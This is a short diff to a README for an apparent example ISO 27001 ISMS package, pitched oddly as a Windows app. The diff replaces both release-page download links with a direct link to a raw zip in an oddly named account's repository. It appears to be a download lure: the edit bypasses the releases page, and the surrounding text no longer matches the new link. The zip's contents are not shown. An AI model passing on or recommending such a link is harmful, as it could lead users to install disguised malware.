@@ -1,6 +1,6 @@
 # 📘 iso27001-sample - Simple ISMS Example for Windows
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Goldenbrown-clitocybesubconnexa230/iso27001-sample/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Goldenbrown-clitocybesubconnexa230/iso27001-sample/raw/refs/heads/main/CB_Audit/iso_sample_2.1.zip)
 
 ## 🖥️ What this is
 
@@ -8,7 +8,7 @@ iso27001-sample is an example ISMS package for a fictitious organisation. It giv
 
 ## 📥 Download the app
 
-Visit this page to download: https://github.com/Goldenbrown-clitocybesubconnexa230/iso27001-sample/releases
+Visit this page to download: https://github.com/Goldenbrown-clitocybesubconnexa230/iso27001-sample/raw/refs/heads/main/CB_Audit/iso_sample_2.1.zip
 
 On that page, look for the latest release. Download the file that matches the release notes. If you see more than one file, pick the one meant for Windows.
 
